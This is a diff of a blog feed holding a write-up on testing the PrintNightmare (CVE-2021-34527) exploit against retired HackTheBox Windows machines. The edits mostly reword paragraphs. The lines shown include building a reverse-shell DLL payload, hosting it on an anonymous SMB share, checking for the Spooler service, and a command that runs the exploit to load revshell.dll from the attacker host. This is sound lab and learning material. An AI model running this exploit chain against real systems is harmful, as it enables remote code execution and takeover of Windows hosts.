@@ -13,11 +13,12 @@
       
       <guid>https://fahmifj.github.io/blog/testing-printnightmare-on-hackthebox/</guid>
       <description>Having fun with a Zero-Day vulnerability</description>
-      <content:encoded><![CDATA[<p>A lot of InfoSec pros I follow on Twitter have been <em>tweeting</em> about a remote code execution vulnerability in the Windows Print Spooler service that could be used for privilege escalation and furthermore, it affects all the Windows versions. Microsoft has assigned CVE-2021-34527 to the vulnerability, which is now publicly known as PrintNightmare.  This vulnerability was accidentally disclosed by security researchers from China, Zhiniang Peng and Xuefeng Li, after Microsoft released a security patch on June 8, 2021 for CVE-2021-1675, which is also a remote code execution in the Print Spooler service. The researchers thought their finding was CVE-2021-1675, but it turned out to be different.</p>
-<p>In this post, I wanted to play around with the print PoC to own <a href="http://hackthebox.eu/">HackTheBox</a> <a href="https://www.hackthebox.eu/newsroom/htb-take-it-easy-july-2021">retired machines</a>. I’m neither an expert nor an infosec pro, so I won’t dive into any technical thing about the vulnerability.</p>
+      <content:encoded><![CDATA[<p>On Twitter, I&rsquo;ve been seeing a lot of tweets about a remote code execution vulnerability in the Windows Print Spooler service, known as PrintNightmare, that could be used for privilege escalation. Furthermore, this vulnerability affects all the Windows versions.</p>
+<p>CVE-2021-34527 has been assigned to the vulnerability. This vulnerability was accidentally disclosed by security researchers from China, Zhiniang Peng and Xuefeng Li, after Microsoft released a security patch on June 8, 2021 for CVE-2021-1675, which is also a remote code execution in the Print Spooler service. The researchers thought their finding was CVE-2021-1675, but it turned out to be different.</p>
+<p>In this post, I want to play around with the PrintNightmare PoC to own Windows <a href="https://www.hackthebox.eu/newsroom/htb-take-it-easy-july-2021">retired machines</a> from <a href="http://hackthebox.eu/">HackTheBox</a>. I’m neither an expert nor an infosec pro, so I won’t dive into any technical thing about the vulnerability.</p>
 <h2 id="preparation">Preparation</h2>
 <p>There are several PoC exploits out there for PrintNightmare, but I will use the one that created by <a href="https://www.hackthebox.eu/profile/9164">Cube0x0</a>.</p>
-<p>To use the exploit, I will have to change my impacket version to the one that has been modified by Cube0x0.  But, changing the currently installed Impacket could mess up my Kali. Therefore, I will use a Python virtual environment using <code>virtualenv</code> module. If you don&rsquo;t have it, install with the following command:</p>
+<p>To use the exploit, I will have to change my impacket version to the one that has been modified by Cube0x0. And to avoid conflict that could mess up other Python tools, I will use a Python virtual environment using <code>virtualenv</code> module. If you don&rsquo;t have it, install with:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ python3 -m pip install virtualenv
 </span></span></code></pre></div><p>The exploit also requires a DLL for later to be loaded on the target machines. This DLL will be hosted on a Samba/SMB server, and it should be configured to allow anonymous access, so that the exploit can directly grab the DLL over SMB.</p>
 <h4 id="working-directory">Working Directory</h4>
@@ -58,7 +59,7 @@
 </span></span><span class="line"><span class="cl">Payload size: <span class="m">460</span> bytes
 </span></span><span class="line"><span class="cl">Final size of dll file: <span class="m">8704</span> bytes
 </span></span></code></pre></div><h4 id="samba-server-configuration">Samba Server Configuration</h4>
-<p>The exploit repo comes with a guide on how to configure a Samba server for hosting the DLL payload, so I will use that for reference.</p>
+<p>The exploit repo includes a guide on how to configure a Samba server for hosting the DLL payload in the README file, so I will use that for reference.</p>
 <p>First, I will create a backup of the original Samba configuration file.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
 </span></span><span class="line"><span class="cl">$ sudo cp /etc/samba/smb.conf<span class="o">{</span>,.bak<span class="o">}</span>
@@ -130,7 +131,7 @@
 <li>Hash or password for a low privileged user (or computer) account</li>
 </ol>
 <p>Since no. 2 and no. 3 are satisfied already, now I just need to verify if the Print Spooler service enabled on the targets.</p>
-<p>As instructed by cube0x0&rsquo;s, I can use <code>rpcdump.py</code> to determine whether the Spooler service is running.</p>
+<p>As instructed by the exploit author, I can use <code>rpcdump.py</code> to determine whether the Spooler service is running.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ rpcdump.py @<span class="o">[</span>IP-ADDRESS<span class="o">]</span> <span class="p">|</span> egrep <span class="s1">&#39;MS-RPRN|MS-PAR&#39;</span>
 </span></span></code></pre></div><p>I figured out that <code>rpcclient</code> can also be used to detect the availability of Print Spooler service by invoking <code>enumprinters</code> command. If the returned output is <strong>&ldquo;Could not initialise spoolss&rdquo;</strong>, then the Print Spooler is most likely to be disabled.</p>
 <p>The following is a dirty bash script I created as a wrapper for checking via <code>rpcdump.py</code> and <code>rpcclient</code> in one run.</p>
@@ -173,7 +174,7 @@
 </span></span><span class="line"><span class="cl">No printers returned.
 </span></span></code></pre></div><p>Based on the results above, Active and Forest don&rsquo;t seem to be vulnerable, but I will still test them out!</p>
 <h2 id="exploitation-1st-attempt">Exploitation 1st Attempt</h2>
-<h3 id="active--failed">Active  (failed)</h3>
+<h3 id="active-failed">Active (failed)</h3>
 <p>As expected, on Active the exploit is failed.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
 </span></span><span class="line"><span class="cl">$ python3 CVE-2021-1675.py active.htb/SVC_TGS:<span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span>@10.10.10.100 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
